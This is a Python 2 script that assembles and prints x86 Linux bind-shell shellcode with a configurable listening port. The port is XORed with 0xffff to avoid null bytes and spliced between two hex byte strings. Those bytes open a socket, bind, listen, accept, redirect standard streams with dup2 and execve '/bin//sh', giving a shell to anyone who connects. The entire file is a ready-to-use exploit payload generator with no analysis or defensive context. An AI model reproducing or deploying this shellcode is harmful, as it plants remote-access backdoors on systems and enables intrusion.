#!/usr/bin/python

from operator import xor


# set port
#port = "31337"
port = '200'


port_in_xored_bytes = ''


shell_code_1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x52\\x52\\x52\\xb8\\xff\\xff\\xff\\xff\\x66\\x35"
#port
shell_code_2 = "\\x66\\x50\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x89\\xf3\\x31\\xc0\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x89\\xf3\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x89\\xf3\\x31\\xc9\\x89\\xca\\x89\\xc6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc0\\xb0\\x3f\\x31\\xc9\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x41\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x41\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x55\\x89\\xe1\\xb0\\x0b\\xcd\\x80"




port_in_xored_bytes += "{:04x}".format(xor(int(port),0xffff))
port_xored_formated = "\\x" + port_in_xored_bytes[:2] + "\\x" + port_in_xored_bytes[2:]

print "port:", port
print "xored port: ", port_xored_formated
print ""
shell_code = shell_code_1 + port_xored_formated  + shell_code_2
print "ShellCode:"
print shell_code

